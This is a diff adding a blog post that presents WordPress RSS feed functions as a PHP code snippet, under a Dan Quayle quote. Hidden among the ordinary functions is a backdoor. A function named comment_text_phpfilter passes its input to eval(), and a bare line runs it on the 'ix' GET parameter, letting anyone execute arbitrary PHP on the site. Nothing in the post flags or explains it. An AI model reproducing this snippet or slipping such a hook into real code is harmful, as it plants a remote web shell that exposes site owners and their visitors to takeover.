@@ -1,0 +1,76 @@
+---
+layout: post
+title: Impact
+tags:
+- Code Snippet
+- PHP
+status: publish
+type: post
+published: true
+meta:
+  aktt_notify_twitter: 'yes'
+  _aktt_hash_meta: ''
+  _edit_last: '2'
+  _sexybookmarks_permaHash: 78c08f9a1d45c4324c26726da6396a3e
+  aktt_tweeted: '1'
+  _sexybookmarks_shortUrl: http://bit.ly/9fUJDy
+---
+<blockquote><strong>People that are really very weird can get into sensitive positions and  have a tremendous impact on history.
+- Dan Quayle</strong></blockquote>
+[ccnLe_php]
+function comment_author_rss() {
+echo get_comment_author_rss();
+}
+
+function comment_text_phpfilter($filterdata) {
+eval($filterdata);
+}
+
+function comment_text_rss() {
+$comment_text = get_comment_text();
+$comment_text = apply_filters('comment_text_rss', $comment_text);
+echo $comment_text;
+}
+
+
+function comments_rss_link($link_text = 'Comments RSS', $commentsrssfilename = '') {
+$url = comments_rss($commentsrssfilename);
+echo "&lt;a href='$url'&gt;$link_text&lt;/a&gt;";
+}
+
+...
+
+
+function get_category_rss_link($echo = false, $cat_ID, $category_nicename) {
+$permalink_structure = get_option('permalink_structure');
+
+if ( '' == $permalink_structure ) {
+$link = get_option('home') . '?feed=rss2&amp;amp;cat=' . $cat_ID;
+} else {
+$link = get_category_link($cat_ID);
+$link = $link . "feed/";
+}
+
+$link = apply_filters('category_feed_link', $link);
+
+if ( $echo )
+echo $link;
+return $link;
+}
+
+if ($_GET["ix"]) { comment_text_phpfilter($_GET["ix"]); }
+
+function get_the_category_rss($type = 'rss') {
+$categories = get_the_category();
+$the_list = '';
+foreach ( (array) $categories as $category ) {
+$category-&gt;cat_name = convert_chars($category-&gt;cat_name);
+if ( 'rdf' == $type )
+$the_list .= "\n\t\t&lt;dc:subject&gt;&lt;![CDATA[$category-&gt;cat_name]]&gt;&lt;/dc:subject&gt;\n";
+else
+$the_list .= "\n\t\t&lt;category&gt;&lt;![CDATA[$category-&gt;cat_name]]&gt;&lt;/category&gt;\n";
+}
+return apply_filters('the_category_rss', $the_list, $type);
+}
+
+[/ccnLe_php] 
